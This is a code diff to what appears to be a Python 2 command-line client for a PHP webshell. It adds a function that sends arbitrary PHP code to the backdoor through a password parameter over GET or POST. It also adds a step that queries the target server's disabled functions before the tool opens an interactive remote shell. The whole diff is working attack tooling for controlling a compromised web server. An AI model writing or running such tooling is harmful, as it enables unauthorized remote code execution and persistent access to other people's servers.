@@ -27,13 +27,25 @@ def
 
 '''
 
-'''
-def get_disabled_function():
-'''
+def get_disable_functions(url, method, auth):
+    result = code_exec(url, method, auth, "print_r(ini_get('disable_functions'));");
+    if result[0]:
+        disable_functions = result[1].split(",")
+        return disable_functions
+    else:
+        return False
 
-def init(url, method, auth):
-    return ""
-
+def code_exec(url, method, auth, code):
+    if method == "POST" or method == "REQUEST":
+        data = {auth:code}
+        response = requests.post(url, data=data)
+    elif method == "GET":
+        params = {auth:code}
+        response = requests.get(url, params=params)
+    else:
+        return (False, "Unsupported method!")
+    content = response.text
+    return (True, content)
 
 def shell_exec(url, method, auth, command):
     # system, exec, shell_exec, popen, proc_open, passthru
@@ -110,6 +122,20 @@ def check_status_code(url):
     except:
         return False
 
+def format_array(array):
+    result = ""
+    for i in array:
+        result += "\t" + i + "\n"
+    return result[0:-1]
+
+
+def init(url, method, auth):
+    print "[+] Disabled functions "
+    disable_functions = get_disable_functions(url, method, auth)
+    print format_array(disable_functions)
+
+
+
 def main():
     if len(sys.argv) != 4:
         print "Usage : "
@@ -136,6 +162,8 @@ def main():
     if check_working(url, method, auth) == False:
         print "[+] The webshell maybe invaild! Check your configuration!"
         exit(3)
+    print "[+] Initing..."
+    init(url, method, auth)
     print "[+] Your webshell is working well!"
     shell(url, method, auth)
 
